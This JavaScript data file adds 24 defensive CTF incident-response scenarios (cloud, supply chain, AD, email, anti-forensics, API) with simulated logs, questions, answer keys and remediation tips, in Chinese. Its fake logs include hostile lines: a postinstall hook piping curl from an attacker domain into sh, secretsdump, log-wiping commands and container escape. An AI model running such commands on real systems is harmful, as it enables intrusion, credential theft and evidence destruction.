/* ============================================================
   data-ctf-extra.js — CTF 攻防剧本库扩容包 B（24 个新剧本）
   云安全 / 供应链 / 域攻击 / 邮件 / 反取证 / 无线物理 / API
   追加进 window.CTF6.A（ctf_cases.js 保持原样）
   ============================================================ */
(function () {
  const r = n => Math.floor(Math.random() * n);
  const pick = a => a[r(a.length)];

  const A = [
  /* ================= 云安全 ================= */
  { st: 1, n: 'AK 泄露利用（云凭据）', pf: ['apt', 'insider'], dmg: { data: 25 },
    ev: c => ({ tel: ['cloud: 检测到泄露 AK 被异常调用（GitHub 泄露源）', 'audit: CreateUser + AttachPolicy AdministratorAccess'],
      files: { '/case/cloud_audit.json': [
        '{"time":"01:00:01","event":"ConsoleLogin","caller":"AKID' + c.ip.replace(/\\./g, '') + '","src":"' + c.ip + '","result":"success"}',
        '{"time":"01:01:00","event":"CreateUser","caller":"AKID泄露源","name":"' + c.user + '_backdoor"}',
        '{"time":"01:01:05","event":"AttachPolicy","caller":"AKID泄露源","name":"' + c.user + '_backdoor","policy":"AdministratorAccess"}',
        '{"time":"01:02:00","event":"DownloadSnapshot","caller":"AKID泄露源","target":"db-snapshot-prod"}',
      ]},
      inv: [{ q: '溯源①：攻击者用泄露 AK 创建的后门账号名并 check 提交', hint: 'grep CreateUser /case/cloud_audit.json 看 name 字段', ans: [c.user + '_backdoor'] },
            { q: '溯源②：攻击者尝试拖取的敏感对象并 check 提交', hint: '找 DownloadSnapshot 的 target', ans: ['db-snapshot-prod'] }],
      need: [['disable', c.user + '_backdoor'], ['hunt', '']],
      ok: '泄露 AK 已禁用轮换，后门账号与快照下载行为已回溯。', teach: '☁️ AK 泄露三步：先禁用轮换止血 → 审计日志回溯它干了什么 → 撤销新建资源。云上身份即边界。' }) },
  { st: 6, n: 'OSS 公开桶枚举下载', pf: ['skid', 'apt'], dmg: { data: 20 },
    ev: c => ({ tel: ['oss: 匿名 GET 洪峰，桶权限为公共读', 'dlp: 敏感文件被批量下载'],
      files: { '/case/oss_access.csv': [
        'time,op,bucket,object,src,code',
        '02:00:01,GET,' + c.dom + '-backup,db_2026.sql.gz,' + c.ip + ',200',
        '02:00:05,GET,' + c.dom + '-backup,keys.json,' + c.ip + ',200',
        '02:00:10,GET,' + c.dom + '-static,logo.png,10.1.1.5,200',
      ]},
      inv: [{ q: '溯源①：被批量下载的桶名并 check 提交', hint: 'grep GET /case/oss_access.csv 看外部 IP 都在拿哪个桶', ans: [c.dom + '-backup'] },
            { q: '溯源②：其中最敏感的凭据文件并 check 提交', hint: 'keys 开头那个对象', ans: ['keys.json'] }],
      need: [['block', c.ip], ['patch', c.dom + '-backup']],
      ok: '桶权限已改私有，泄露文件全部轮换。', teach: '🪣 备份桶永远不该公共读；对象存储三件套：桶级权限+加密+访问日志。' }) },
  { st: 4, n: '容器逃逸（privileged 挂载）', pf: ['apt', 'bot'], dmg: { biz: 20 },
    ev: c => ({ tel: ['k8s: 检测到 privileged 容器启动并挂载宿主根目录', 'edr: 容器内出现 chroot /host 行为'],
      files: { '/case/k8s_audit.json': [
        '{"time":"04:00:00","verb":"create","object":"pod","name":"' + c.host.toLowerCase() + '-esc","user":"dev:sam","image":"busybox","privileged":true,"mounts":":/host"}',
        '{"time":"04:00:10","verb":"create","object":"pods/exec","pod":"' + c.host.toLowerCase() + '-esc","user":"dev:sam","cmd":"chroot /host sh"}',
      ]},
      inv: [{ q: '溯源①：实施逃逸的 Pod 名并 check 提交', hint: 'grep pods/exec /case/k8s_audit.json 看 pod 字段', ans: [c.host.toLowerCase() + '-esc'] },
            { q: '溯源②：逃逸动作读取的宿主机路径并 check 提交', hint: '看 chroot 命令的参数与挂载配置', ans: ['/host'] }],
      need: [['rm', c.host.toLowerCase() + '-esc'], ['isolate', c.host]],
      ok: '逃逸容器已删除，宿主机已隔离排查。', teach: '📦 privileged + 挂根 = 完全逃逸。生产集群默认禁止 privileged，RBAC 限制开发者建 Pod。' }) },
  { st: 5, n: 'K8s RBAC 提权滥用', pf: ['apt'], dmg: { biz: 15 },
    ev: c => ({ tel: ['k8s: 开发者账号创建了 cluster-admin 绑定', 'audit: pods/exec 进入生产 Pod'],
      files: { '/case/k8s_rbac.json': [
        '{"time":"04:00:00","verb":"create","object":"clusterrolebinding.rbac","name":"cluster-admin-tmp","user":"dev:sam"}',
        '{"time":"04:02:00","verb":"create","object":"pods/exec","pod":"prod-api-7d9","user":"dev:sam","container":"main"}',
      ]},
      inv: [{ q: '溯源①：被创建的恶意 ClusterRoleBinding 名并 check 提交', hint: 'cat /case/k8s_rbac.json 看 clusterrolebinding 的 name', ans: ['cluster-admin-tmp'] },
            { q: '溯源②：被 exec 进入的生产 Pod 并 check 提交', hint: 'pods/exec 那条的 pod 字段', ans: ['prod-api-7d9'] }],
      need: [['rm', 'cluster-admin-tmp'], ['isolate', 'prod-api-7d9']],
      ok: '恶意绑定已删除，生产 Pod 已隔离排查。', teach: '☸️ K8s 提权三部曲：建绑定→进 Pod→碰数据。RBAC 变更与 pods/exec 必须审计告警。' }) },

  /* ================= 供应链 ================= */
  { st: 1, n: 'CI/CD 流水线投毒', pf: ['apt', 'insider'], dmg: { biz: 20 },
    ev: c => ({ tel: ['ci: 构建产物被注入额外后门文件（签名校验失败）', 'edr: 多台服务器部署新版本后出现相同外联'],
      files: { '/case/ci_log.txt': [
        '10:00:00 BUILD #1421 by dev-ci（正常构建）',
        '10:30:00 BUILD #1422 by unknown-external（签名校验: FAIL）',
        '10:30:10 SCAN 产物发现后门: 反连 ' + c.dom,
        '11:00:00 DEPLOY app-v2.3.1 到生产（人工 bypass 审批）',
      ]},
      inv: [{ q: '溯源①：被投毒的构建编号并 check 提交', hint: 'grep FAIL /case/ci_log.txt 看构建号', ans: ['1422'] },
            { q: '溯源②：后门反连的域名并 check 提交', hint: '看 SCAN 行的反连地址', ans: [c.dom] }],
      need: [['rm', 'app-v2.3.1'], ['patch', 'cicd']],
      ok: '带毒产物已下线，构建审批流已修复。', teach: '🔁 供应链投毒的标志：签名校验 FAIL + 未知构建者。镜像签名校验+双人审批是解。' }) },
  { st: 1, n: '依赖混淆攻击', pf: ['apt'], dmg: { biz: 15 },
    ev: c => ({ tel: ['npm: 内部私有包名在公共仓库被抢注并下载', 'edr: 构建机安装依赖后出现编译期执行脚本'],
      files: { '/case/npm_audit.txt': [
        '包名: lodash-internal（内部私有包）\n公共仓库出现同名包 版本 99.9.9（依赖混淆：高版本优先）\n安装钩子: postinstall -> curl http://' + c.dom + '/sh | sh\n受害构建机: builder-03（已外联）',
      ]},
      inv: [{ q: '溯源①：被抢注的包名并 check 提交', hint: 'cat /case/npm_audit.txt 第一行', ans: ['lodash-internal'] },
            { q: '溯源②：攻击载荷的下载地址并 check 提交', hint: '看 postinstall 钩子的 curl 目标', ans: [c.dom] }],
      need: [['block', c.dom], ['patch', 'npm']],
      ok: '内包已加 scope 隔离，构建机已排查。', teach: '🧩 依赖混淆：公共源优先于私有源。解法：scope 隔离+包名抢占+安装钩子审计。' }) },
  { st: 1, n: '软件更新劫持', pf: ['apt', 'ransom'], dmg: { biz: 15 },
    ev: c => ({ tel: ['net: 内网 12 台主机从非常规源下载"更新包"', 'edr: 更新包携带合法签名但行为异常'],
      files: { '/case/update.log': [
        '02:00:00 download http://updates.' + c.dom + '/patch.exe -> 12 hosts',
        '02:01:00 exec patch.exe（签名: 无效/自签）',
        '02:02:00 外联 ' + c.ip + ':8443（C2 心跳）',
      ]},
      inv: [{ q: '溯源①：被劫持的更新源域名并 check 提交', hint: 'cat /case/update.log 看 download 行', ans: ['updates.' + c.dom] },
            { q: '溯源②：更新包回连的 C2 地址并 check 提交', hint: '看外联行', ans: [c.ip] }],
      need: [['block', c.ip], ['isolate', '12 台主机中的 1 台']],
      ok: '劫持源已封禁，样本主机已隔离取证。', teach: '🧲 更新劫持=供应链+边界双杀。更新必须校验签名+固定源+内网分发。' }) },

  /* ================= 域攻击 ================= */
  { st: 4, n: 'LLMNR/NBNS 投毒抓凭据', pf: ['apt', 'ransom'], dmg: { data: 15 },
    ev: c => ({ tel: ['ndr: Responder 特征（LLMNR 应答劫持）', 'win: 捕获 Net-NTLMv2 哈希并离线爆破'],
      files: { '/case/ndr_poison.log': [
        '10:00:00 LLMNR query: FileServer01（不存在的主机名=投毒诱饵）\n10:00:01 poison response from ' + c.ip + '（伪造应答）\n10:00:30 captured Net-NTLMv2: ops01::SAE8...（离线爆破中）',
      ]},
      inv: [{ q: '溯源①：实施投毒的主机 IP 并 check 提交', hint: 'cat /case/ndr_poison.log 看 poison response 来源', ans: [c.ip] },
            { q: '溯源②：被捕获哈希的账号并 check 提交', hint: '看 captured 行的账号名', ans: ['ops01'] }],
      need: [['block', c.ip], ['passwd', 'ops01']],
      ok: '投毒源已封禁，被捕获账号已强制改密。', teach: '🎭 关闭 LLMNR/NBNS（组策略）+ 禁 NTLMv2 + 账号单独密码，投毒就无米下锅。' }) },
  { st: 4, n: 'GPP 密码（组策略偏好）', pf: ['apt'], dmg: { data: 15 },
    ev: c => ({ tel: ['win: SYSVOL 中发现groups.xml（含加密的本地管理员密码）', 'attack: MS14-025 利用解密成功'],
      files: { '/case/gpp.xml': [
        '<Groups><User name="LocalAdmin"><Properties cpassword="j1E9BZc8XYZ=" /></User></Groups>',
        '注: cpassword 使用公开的 AES 密钥加密，MS14-025 后微软已修补但旧 XML 残留常见',
      ]},
      inv: [{ q: '溯源①：含残留密码的文件名并 check 提交', hint: 'cat /case/gpp.xml', ans: ['gpp.xml', 'groups.xml'] },
            { q: '溯源②：加密密码的字段名并 check 提交', hint: 'XML 里的 cpassword', ans: ['cpassword'] }],
      need: [['patch', 'MS14-025'], ['passwd', 'LocalAdmin']],
      ok: '残留 XML 已清除，本地管理员密码已轮换。', teach: '🗝️ GPP 残留是域内"公开的后门"：清 SYSVOL 里的 groups.xml + 轮换所有本地管理员密码。' }) },
  { st: 4, n: 'Zerologon 域控攻击', pf: ['apt'], dmg: { biz: 25, data: 20 },
    ev: c => ({ tel: ['dc: Netlogon 特征命中 CVE-2020-1472（置空域控机器密码）', 'attack: 攻击者尝试 DCSync 导出全部哈希'],
      files: { '/case/dc_zerologon.txt': [
        '10:00:00 Netlogon 改密请求 ×1000（ exploit: ZeroLogon 特征）\n10:00:10 机器密码被置空\n10:01:00 DCSync 尝试: DR SUITE from ' + c.ip,
      ]},
      inv: [{ q: '溯源①：被利用的漏洞编号并 check 提交', hint: 'cat /case/dc_zerologon.txt', ans: ['CVE-2020-1472', 'Zerologon', '1472'] },
            { q: '溯源②：攻击发起源 IP 并 check 提交', hint: '看 DCSync 尝试行', ans: [c.ip] }],
      need: [['patch', 'zerologon'], ['passwd', 'krbtgt']],
      ok: '域控已打补丁，krbtgt 两次重置完成。', teach: '👑 Zerologon 后必须：打补丁+重置机器密码+krbtgt 两次重置+排查黄金票据残留。' }) },
  { st: 5, n: '黄金票据（Golden Ticket）', pf: ['apt'], dmg: { data: 25 },
    ev: c => ({ tel: ['dc: TGT 异常：有效期 10 年的票据出现在普通账号', 'attack: krbtgt 哈希曾被 DCSync 获取（历史事件关联）'],
      files: { '/case/golden.txt': [
        'Ticket: user=helpdesk03 domain=CORP rid=1103 lifetime=10y\n加密方式: krbtgt 哈希（攻击者已持有）\n特征: 同一 TGT 在多台"从未登录"的主机出现',
      ]},
      inv: [{ q: '溯源①：伪造票据依赖的密钥持有账号并 check 提交', hint: 'cat /case/golden.txt 看加密方式行', ans: ['krbtgt'] },
            { q: '溯源②：票据的可疑有效期并 check 提交', hint: 'lifetime 字段', ans: ['10y', '10年', '10'] }],
      need: [['passwd', 'krbtgt'], ['isolate', 'DC01']],
      ok: 'krbtgt 两次重置完成，全部黄金票据作废。', teach: '🎫 黄金票据的解药只有一个：krbtgt 账号重置两次（间隔大于票据寿命），并排查全部异常 TGT。' }) },
  { st: 4, n: 'AD CS ESC1 证书提权', pf: ['apt'], dmg: { data: 20 },
    ev: c => ({ tel: ['adcs: 证书模板允许 SAN 申请者自填（ESC1）', 'attack: 以域管身份申请证书成功'],
      files: { '/case/adcs.txt': [
        '模板: CorpUserAuth  ENROLLEE_SUPPLIES_SUBJECT: True（可自填 SAN）\n申请: user=dev:sam SAN=administrator@corp.local → 证书签发成功\n用途: 域管身份认证（Kerberos PKINIT）',
      ]},
      inv: [{ q: '溯源①：被滥用的证书模板名并 check 提交', hint: 'cat /case/adcs.txt 看模板行', ans: ['CorpUserAuth'] },
            { q: '溯源②：伪造的 SAN 身份并 check 提交', hint: '看申请行的 SAN 字段', ans: ['administrator@corp.local', 'administrator'] }],
      need: [['patch', 'CorpUserAuth'], ['passwd', 'administrator']],
      ok: '危险模板已修复，伪造证书已吊销。', teach: '📜 AD CS 是新的提权金矿：模板配置"ENROLLEE_SUPPLIES_SUBJECT"+域管授权=ESC1。用 Certipy/Locksmith 定期审计模板。' }) },
  { st: 4, n: 'secretsdump 凭据转储', pf: ['apt', 'ransom'], dmg: { data: 20 },
    ev: c => ({ tel: ['edr: Impacket secretsdump 特征（远程注册表读取 + 哈希批量导出）'],
      files: { '/case/dump.txt': [
        'remote exec: secretsdump.py corp/admin@' + c.host.replace(/\\w.*/, '') + '（来源 ' + c.ip + '）\noutput: NTLM 哈希 ×240（含域管）\n随后: 同哈希出现在 3 台主机的登录中（哈希复用横向）',
      ]},
      inv: [{ q: '溯源①：使用的转储工具名并 check 提交', hint: 'cat /case/dump.txt', ans: ['secretsdump'] },
            { q: '溯源②：转储来源 IP 并 check 提交', hint: '看来源字段', ans: [c.ip] }],
      need: [['isolate', c.host], ['passwd', 'administrator']],
      ok: '转储源已隔离，全部暴露凭据已轮换。', teach: '🗄️ 凭据转储后必须"全量轮换"——攻击者拿到的是哈希库，只改一个密码等于没改。' }) },

  /* ================= 邮件 ================= */
  { st: 6, n: 'BEC 仿冒 CEO 诈骗', pf: ['insider'], dmg: { data: 10 },
    ev: c => ({ tel: ['mailgw: 外部仿冒域名发来"紧急汇款"指示（SPF fail）', 'fin: 财务已按邮件准备转账（ luckily 未执行）'],
      files: { '/case/bec.txt': [
        'FROM ceo@corp-cfo.xyz → cfo01（Display Name: CEO 张伟）\nsubject: 急：供应商款项变更\nbody: 因审计原因，本次款项打入新账户 6222****8891，金额 460000 元，今天 17 点前完成',
      ]},
      inv: [{ q: '溯源①：仿冒发件域名并 check 提交', hint: 'cat /case/bec.txt 看 FROM', ans: ['corp-cfo.xyz'] },
            { q: '溯源②：被要求的转账金额并 check 提交', hint: '看 body 里的数字', ans: ['460000', '46万', '460,000'] }],
      need: [['patch', '转账审批'], ['hunt', '']],
      ok: '仿冒域名已拦截，财务流程加入双通道确认。', teach: '👑 BEC 不利用漏洞只利用信任：大额/变更账户必须电话+面对面双通道核实。' }) },
  { st: 3, n: '隐藏邮件规则后门', pf: ['insider', 'apt'], dmg: { data: 10 },
    ev: c => ({ tel: ['mail: 用户邮箱被添加收件转发规则（非本人操作）', 'attack: 所有含"发票/付款"的邮件自动转发至外部'],
      files: { '/case/mailrule.txt': [
        'mailbox: cfo01@corp.com\nrule: IF 主题含"发票 OR 付款" → 转发至 attacker@' + c.dom + ' 并标记已读\n创建时间: 凌晨 03:12（非工作时间）来源: 移动端',
      ]},
      inv: [{ q: '溯源①：恶意转发规则的目标邮箱并 check 提交', hint: 'cat /case/mailrule.txt 看转发至', ans: ['attacker@' + c.dom] },
            { q: '溯源②：规则创建的异常时间并 check 提交', hint: '看创建时间行', ans: ['03:12', '凌晨'] }],
      need: [['rm', '转发规则'], ['passwd', 'cfo01']],
      ok: '恶意规则已删除，邮箱已改密并核查其他规则。', teach: '📨 攻陷邮箱后立加转发规则=静默监控。定期审计全部邮箱的服务器端转发规则。' }) },

  /* ================= 反取证 ================= */
  { st: 5, n: '批量清除安全日志', pf: ['apt', 'ransom'], dmg: { biz: 10 },
    ev: c => ({ tel: ['edr: wevtutil cl 批量清除 Windows 事件日志（1102）', 'linux: /var/log/secure 被清空'],
      files: { '/case/antifor.txt': [
        'cmd: wevtutil cl Security / cl System / cl Application\nlinux: echo "" > /var/log/secure; history -c\n特征: 攻击者在 清理前 1 分钟内 曾登录（4624）',
      ]},
      inv: [{ q: '溯源①：Windows 清日志的事件 ID 并 check 提交', hint: 'cat /case/antifor.txt 看 wevtutil 行', ans: ['1102'] },
            { q: '溯源②：Linux 清 history 的命令并 check 提交', hint: '看 linux 行', ans: ['history -c', 'history'] }],
      need: [['hunt', ''], ['passwd', 'administrator']],
      ok: '清日志主机已定位（1102+外接设备关联），攻击会话已还原。', teach: '🧹 清日志本身是最高级别警报之一：把日志实时外发（SIEM）才能让灭迹失效。' }) },
  { st: 5, n: '文件时间戳篡改（Timestomp）', pf: ['apt'], dmg: { biz: 5 },
    ev: c => ({ tel: ['edr: 恶意文件的修改时间早于系统安装时间', 'mft: MFT 记录与 $STANDARD_INFORMATION 不一致'],
      files: { '/case/timestomp.txt': [
        '文件: C:\\Windows\\Temp\\svhost.exe\n$SI 时间: 2015-01-01（伪造，早于系统安装）\n$FILE_NAME 属性时间: 2026-07-18 03:12（真实，来自 MFT）',
      ]},
      inv: [{ q: '溯源①：被篡改时间戳的工具特征名并 check 提交', hint: 'cat /case/timestomp.txt 看标题行', ans: ['Timestomp', 'timestomp'] },
            { q: '溯源②：真实时间来自哪个属性并 check 提交', hint: '看括号里的 MFT 说明', ans: ['$FILE_NAME', 'MFT'] }],
      need: [['hunt', ''], ['isolate', 'PC-07']],
      ok: '伪造时间的文件已定位并取样，主机已隔离。', teach: '⏱️ 时间戳伪造可骗"修改时间"，但骗不过 MFT 的 $FILE_NAME 属性——多属性交叉是取证基本功。' }) },

  /* ================= 无线/物理 ================= */
  { st: 1, n: '恶意 WiFi 热点钓鱼', pf: ['bot', 'insider'], dmg: { data: 15 },
    ev: c => ({ tel: ['wifi: 出现与公司 SSID 同名的开放热点（Evil Twin）', 'proxy: 员工连接后访问内网邮箱被中间人截获'],
      files: { '/case/wifi.log': [
        'AP: CORP-WiFi（伪造，MAC 与正规 AP 不同）信道 6 开放无加密\n受害者: 3 名员工自动连接（设备记住同名 SSID）\n截获: webmail 登录表单 ×3（含账号）',
      ]},
      inv: [{ q: '溯源①：伪造热点的 SSID 名称并 check 提交', hint: 'cat /case/wifi.log 看 AP 行', ans: ['CORP-WiFi'] },
            { q: '溯源②：被截获的表单类型并 check 提交', hint: '看截获行', ans: ['webmail', '邮箱', '登录'] }],
      need: [['patch', 'wifi'], ['passwd', 'ops01']],
      ok: '伪造热点定位关闭，员工强制改密并培训。', teach: '📶 企业 WiFi 全员 WPA2-Enterprise（证书认证），设备关掉"自动连接开放网络"。' }) },
  { st: 1, n: 'USB 摆渡攻击', pf: ['insider', 'bot'], dmg: { data: 10 },
    ev: c => ({ tel: ['edr: 检测到 USB 设备注入 HID 指令（BadUSB 特征）', 'dlp: U 盘拷贝敏感目录'],
      files: { '/case/usb.log': [
        'device: USB\\VID_1234（伪装键盘的 BadUSB）\n行为: 3 秒内注入 47 次按键（PowerShell 下载器）\ndlp: 拷贝 /finance/2026 预算.xlsx 至可移动介质',
      ]},
      inv: [{ q: '溯源①：USB 设备的攻击类型并 check 提交', hint: 'cat /case/usb.log 看 device 行', ans: ['BadUSB', 'badusb'] },
            { q: '溯源②：被拷贝的敏感文件所在目录并 check 提交', hint: '看 dlp 行', ans: ['/finance/2026', 'finance'] }],
      need: [['patch', 'usb'], ['isolate', 'PC-15']],
      ok: 'BadUSB 特征加入外设黑名单，涉事主机已排查。', teach: '💾 捡到的 U 盘不要插！终端侧：USB 只读策略+HID 注入检测+外设白名单。' }) },

  /* ================= API / 侦察 ================= */
  { st: 6, n: 'API 未授权遍历', pf: ['skid', 'apt'], dmg: { data: 20 },
    ev: c => ({ tel: ['api: /api/v2/user/{id} 无鉴权，遍历 1-10000', 'db: 响应包含手机号与身份证字段'],
      files: { '/case/api_abuse.log': [
        'GET /api/v2/user/10001 → 200 (含手机号)\nGET /api/v2/user/10002 → 200\n...（同 IP 连续 5000 次，无 Token）\nUA: python-requests/2.31',
      ]},
      inv: [{ q: '溯源①：被遍历的接口路径并 check 提交', hint: 'cat /case/api_abuse.log 看连续请求的共同路径', ans: ['/api/v2/user/'] },
            { q: '溯源②：遍历使用的 UA 特征并 check 提交', hint: '看 UA 行', ans: ['python-requests'] }],
      need: [['block', c.ip], ['patch', 'api']],
      ok: '遍历源已封禁，接口已加鉴权与限流。', teach: '🔓 IDOR/未授权遍历的修复：对象级鉴权（校验属主）+ 限流 + 敏感字段脱敏。' }) },
  { st: 6, n: 'GraphQL 内省泄露', pf: ['skid', 'apt'], dmg: { data: 15 },
    ev: c => ({ tel: ['api: introspection 查询返回完整 schema（含内部字段）', 'attack: 利用 schema 中的隐藏接口批量拉取用户'],
      files: { '/case/gql.txt': [
        'POST /graphql body: {__schema{types{name fields{name}}}}\nresult: 泄露 User.phone / User.idCard / adminQuery 等 87 个字段\n随后: adminQuery 批量调用 ×3000',
      ]},
      inv: [{ q: '溯源①：被利用的 GraphQL 端点路径并 check 提交', hint: 'cat /case/gql.txt 看 POST 行', ans: ['/graphql'] },
            { q: '溯源②：被泄露的敏感字段（任选其一）并 check 提交', hint: '看泄露字段列表', ans: ['User.idCard', 'idCard', 'User.phone'] }],
      need: [['block', c.ip], ['patch', 'graphql']],
      ok: '内省已关闭，敏感字段已脱敏。', teach: '🕸️ 生产环境 GraphQL 必须关闭 introspection + 字段级鉴权 + 查询深度限制。' }) },

  /* ================= 侦察 / 内网 ================= */
  { st: 0, n: 'LDAP 匿名枚举', pf: ['skid', 'apt'], dmg: {},
    ev: c => ({ tel: ['dc: 匿名 LDAP 绑定成功并枚举全部域用户（信息侦察）'],
      files: { '/case/ldap_enum.txt': [
        'bind: anonymous（匿名绑定未禁用）\nenum: users ×820 / groups ×46 / computers ×310\n特征: 工具 ldapsearch（UA 无）来源 ' + c.ip,
      ]},
      inv: [{ q: '溯源①：枚举使用的协议并 check 提交', hint: 'cat /case/ldap_enum.txt 看 bind 行', ans: ['LDAP', 'ldap'] },
            { q: '溯源②：枚举到的用户数量并 check 提交', hint: '看 enum 行数字', ans: ['820'] }],
      need: [['block', c.ip], ['patch', 'ldap']],
      ok: '匿名绑定已禁用，枚举源已封禁。', teach: '🔍 匿名 LDAP 枚举是域侦察第一步：禁匿名绑定+枚举频率告警，让侦察变盲。' }) },
  { st: 4, n: 'ARP 欺骗中间人', pf: ['skid', 'bot'], dmg: { data: 10 },
    ev: c => ({ tel: ['ndr: 同一 MAC 对应两个 IP（网关 ARP 被抢占）', 'victim: 员工流量经攻击主机转发（中间人）'],
      files: { '/case/arp.log': [
        'gateway 10.1.1.1 的 MAC 从 aa:bb:cc:11 变为 aa:bb:cc:EVIL（来自 ' + c.ip + '）\n受害: 10.1.1.50 的流量被转发（可截获明文凭据）\n频率: 每 3 秒重发一次 ARP 应答',
      ]},
      inv: [{ q: '溯源①：发送伪造 ARP 的主机 IP 并 check 提交', hint: 'cat /case/arp.log 看 MAC 变更来源', ans: [c.ip] },
            { q: '溯源②：被中间人的受害主机 IP 并 check 提交', hint: '看受害行', ans: ['10.1.1.50'] }],
      need: [['block', c.ip], ['isolate', '10.1.1.50']],
      ok: '欺骗主机已隔离，交换机端口安全已启用。', teach: ' ↔️ ARP 欺骗的解：交换机动态 ARP 检测（DAI）+ 静态绑定网关。' }) },

  /* ================= 定点 ================= */
  { st: 1, n: '水坑攻击（定点埋伏）', pf: ['apt'], dmg: { data: 15 },
    ev: c => ({ tel: ['waf: 行业协会网站被植入跳板脚本（供应链上游）', 'edr: 我方 2 名员工访问该站后下载了恶意更新'],
      files: { '/case/watering.txt': [
        'victim 行业协会官网 index.html 被注入 <script src=evil.' + c.dom + '>\n我方员工 2 人访问 → 下载 fake_update.exe\nC2: ' + c.ip + ':443（TLS 伪装）',
      ]},
      inv: [{ q: '溯源①：被植入跳板脚本的目标网站类型并 check 提交', hint: 'cat /case/watering.txt 第一行', ans: ['行业协会', '协会'] },
            { q: '溯源②：员工被诱导下载的文件名并 check 提交', hint: '看下载行', ans: ['fake_update.exe'] }],
      need: [['block', c.dom], ['patch', 'browser']],
      ok: '恶意域名已封禁，2 台主机已隔离排查。', teach: '🌊 水坑打的是"你的习惯"：行业上游站点被埋伏。检测：员工访问非白名单外部站点后立刻出现下载行为。' }) },
  ];

  window.CTF6.A.push(...A);
  console.log && console.log('[ctf-extra] +' + A.length + ' attacks');
})();
